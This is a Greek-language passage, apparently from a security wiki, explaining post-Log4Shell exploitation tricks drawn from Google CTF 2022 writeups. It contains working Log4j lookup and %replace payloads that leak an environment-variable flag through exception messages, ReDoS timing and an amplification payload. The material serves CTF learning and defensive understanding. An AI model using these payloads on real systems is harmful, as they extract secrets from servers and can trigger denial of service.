- [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Μετά την Εκμετάλλευση Log4Shell

Σε αυτήν την [**CTF αναφορά**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) εξηγείται καλά πώς είναι δυνητικά **δυνατό** να **καταχραστεί** κάποια χαρακτηριστικά του **Log4J**.

Η [**σελίδα ασφαλείας**](https://logging.apache.org/log4j/2.x/security.html) του Log4j έχει μερικές ενδιαφέρουσες προτάσεις:

> Από την έκδοση 2.16.0 (για Java 8), η **λειτουργία αναζητήσεων μηνυμάτων έχει αφαιρεθεί εντελώς**. **Οι αναζητήσεις στη διαμόρφωση εξακολουθούν να λειτουργούν**. Επιπλέον, το Log4j τώρα απενεργοποιεί την πρόσβαση στο JNDI από προεπιλογή. Οι αναζητήσεις JNDI στη διαμόρφωση πρέπει τώρα να ενεργοποιούνται ρητά.

> Από την έκδοση 2.17.0, (και 2.12.3 και 2.3.1 για Java 7 και Java 6), **μόνο οι συμβολοσειρές αναζητήσεων στη διαμόρφωση επεκτείνονται αναδρομικά**; σε οποιαδήποτε άλλη χρήση, μόνο η αναζήτηση κορυφαίου επιπέδου επιλύεται, και οποιεσδήποτε εσωτερικές αναζητήσεις δεν επιλύονται.

Αυτό σημαίνει ότι από προεπιλογή μπορείτε να **ξεχάσετε τη χρήση οποιασδήποτε εκμετάλλευσης `jndi`**. Επιπλέον, για να εκτελέσετε **αναδρομικές αναζητήσεις** πρέπει να τις έχετε ρυθμίσει.

Για παράδειγμα, σε αυτήν την CTF αυτό είχε ρυθμιστεί στο αρχείο log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Αναζητήσεις Περιβάλλοντος

Στο [αυτό το CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) ο επιτιθέμενος έλεγχε την τιμή του `${sys:cmd}` και χρειαζόταν να εξάγει τη σημαία από μια μεταβλητή περιβάλλοντος.\
Όπως φαίνεται σε αυτή τη σελίδα στις [**προηγούμενες payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) υπάρχουν διάφοροι τρόποι πρόσβασης σε μεταβλητές περιβάλλοντος, όπως: **`${env:FLAG}`**. Σε αυτό το CTF αυτό ήταν άχρηστο αλλά μπορεί να μην είναι σε άλλες πραγματικές καταστάσεις.

### Εξαγωγή σε Εξαιρέσεις

Στο CTF, **δεν μπορούσες να έχεις πρόσβαση στο stderr** της εφαρμογής java χρησιμοποιώντας log4J, αλλά οι **εξαιρέσεις Log4J αποστέλλονται στο stdout**, το οποίο εκτυπωνόταν στην εφαρμογή python. Αυτό σήμαινε ότι με την πρόκληση μιας εξαίρεσης μπορούσαμε να έχουμε πρόσβαση στο περιεχόμενο. Μια εξαίρεση για να εξάγουμε τη σημαία ήταν: **`${java:${env:FLAG}}`.** Αυτό λειτουργεί γιατί **`${java:CTF{blahblah}}`** δεν υπάρχει και μια εξαίρεση με την τιμή της σημαίας θα εμφανιστεί:

![](<../../images/image (1023).png>)

### Εξαιρέσεις Προτύπων Μετατροπής

Απλώς για να το αναφέρω, θα μπορούσες επίσης να εισάγεις νέα [**πρότυπα μετατροπής**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) και να προκαλέσεις εξαιρέσεις που θα καταγραφούν στο `stdout`. Για παράδειγμα:

![](<../../images/image (683).png>)

Αυτό δεν βρέθηκε χρήσιμο για να εξάγουμε δεδομένα μέσα στο μήνυμα σφάλματος, επειδή η αναζήτηση δεν επιλύθηκε πριν από το πρότυπο μετατροπής, αλλά θα μπορούσε να είναι χρήσιμο για άλλα πράγματα όπως η ανίχνευση.

### Regexes Προτύπων Μετατροπής

Ωστόσο, είναι δυνατόν να χρησιμοποιήσεις κάποια **πρότυπα μετατροπής που υποστηρίζουν regexes** για να εξάγεις πληροφορίες από μια αναζήτηση χρησιμοποιώντας regexes και κακοποιώντας **δυαδική αναζήτηση** ή **χρονικές** συμπεριφορές.

- **Δυαδική αναζήτηση μέσω μηνυμάτων εξαίρεσης**

Το πρότυπο μετατροπής **`%replace`** μπορεί να χρησιμοποιηθεί για να **αντικαταστήσει** **περιεχόμενο** από μια **αλφαριθμητική συμβολοσειρά** ακόμη και χρησιμοποιώντας **regexes**. Λειτουργεί ως εξής: `replace{pattern}{regex}{substitution}`\
Κακοποιώντας αυτή τη συμπεριφορά θα μπορούσες να κάνεις την αντικατάσταση **να προκαλέσει μια εξαίρεση αν το regex ταίριαζε** με οτιδήποτε μέσα στη συμβολοσειρά (και καμία εξαίρεση αν δεν βρεθεί) όπως αυτό:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
- **Βασισμένο στον χρόνο**

Όπως αναφέρθηκε στην προηγούμενη ενότητα, **`%replace`** υποστηρίζει **regexes**. Έτσι, είναι δυνατόν να χρησιμοποιηθεί payload από τη [**σελίδα ReDoS**](../regular-expression-denial-of-service-redos.md) για να προκαλέσει ένα **timeout** σε περίπτωση που βρεθεί η σημαία.\
Για παράδειγμα, ένα payload όπως το `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` θα ενεργοποιούσε ένα **timeout** σε αυτή την CTF.

Σε αυτή την [**αναφορά**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), αντί να χρησιμοποιηθεί μια επίθεση ReDoS, χρησιμοποιήθηκε μια **επίθεση ενίσχυσης** για να προκαλέσει μια διαφορά χρόνου στην απάντηση:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Αν η σημαία ξεκινά με `flagGuess`, η ολόκληρη σημαία αντικαθίσταται με 29 `#`-s (χρησιμοποίησα αυτό το χαρακτήρα γιατί πιθανότατα δεν θα είναι μέρος της σημαίας). **Κάθε ένα από τα 29 `#`-s αντικαθίσταται στη συνέχεια με 54 `#`-s**. Αυτή η διαδικασία επαναλαμβάνεται **6 φορές**, οδηγώντας σε ένα σύνολο ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
> Η αντικατάσταση τόσων πολλών `#`-s θα ενεργοποιήσει το 10-δευτερόλεπτο timeout της εφαρμογής Flask, το οποίο με τη σειρά του θα έχει ως αποτέλεσμα την αποστολή του κωδικού κατάστασης HTTP 500 στον χρήστη. (Αν η σημαία δεν ξεκινά με `flagGuess`, θα λάβουμε έναν μη 500 κωδικό κατάστασης)

## Αναφορές

- [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
- [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
- [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
- [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
- [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
- [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

{{#include ../../banners/hacktricks-training.md}}
